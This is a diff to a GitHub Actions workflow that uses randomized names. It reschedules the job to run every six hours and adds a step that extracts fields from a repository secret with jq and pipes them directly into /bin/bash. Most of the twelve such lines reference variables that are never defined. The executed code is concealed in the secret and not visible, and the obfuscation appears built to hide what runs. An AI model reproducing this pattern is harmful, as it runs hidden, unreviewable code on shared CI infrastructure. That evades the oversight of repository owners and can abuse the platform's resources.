@@ -2,7 +2,7 @@ name: zgjdfbl
 on:
   workflow_dispatch:
   schedule:
-    - cron: '9 1/6 * * *'
+    - cron: '49 2/6 * * *'
 
 jobs:
   build:
@@ -12,12 +12,18 @@ jobs:
       - uses: actions/checkout@v4
       - name: zgjdfbl
         env:
-          bipy26244: ${{ secrets.bipy26244 }}
+          zkeap170: ${{ secrets.zkeap170 }}
         run: |
-          echo $bipy26244 | jq -r .hxca872 | /bin/bash
-          echo $cmxql76 | jq -r .ta4994 | /bin/bash
-          echo $ebklp1 | jq -r .llpra1 | /bin/bash
-          echo $rm99 | jq -r .dq353 | /bin/bash
-          echo $sbn07 | jq -r .u670 | /bin/bash
-          echo $yxv61238 | jq -r .bkzb5167 | /bin/bash
+          echo $zkeap170 | jq -r .yf14477 | /bin/bash
+          echo $mawqo18 | jq -r .t625 | /bin/bash
+          echo $gc30457 | jq -r .bc93 | /bin/bash
+          echo $xwt68 | jq -r .mzz2810 | /bin/bash
+          echo $qaz069 | jq -r .ebxxh35060 | /bin/bash
+          echo $evr3 | jq -r .bmnh88 | /bin/bash
+          echo $maed8 | jq -r .x6 | /bin/bash
+          echo $ejon5 | jq -r .w42 | /bin/bash
+          echo $edxz717 | jq -r .fttlh2393 | /bin/bash
+          echo $zjy8 | jq -r .yzwou0 | /bin/bash
+          echo $k7 | jq -r .brf4 | /bin/bash
+          echo $gfafk29781 | jq -r .opim592 | /bin/bash
 
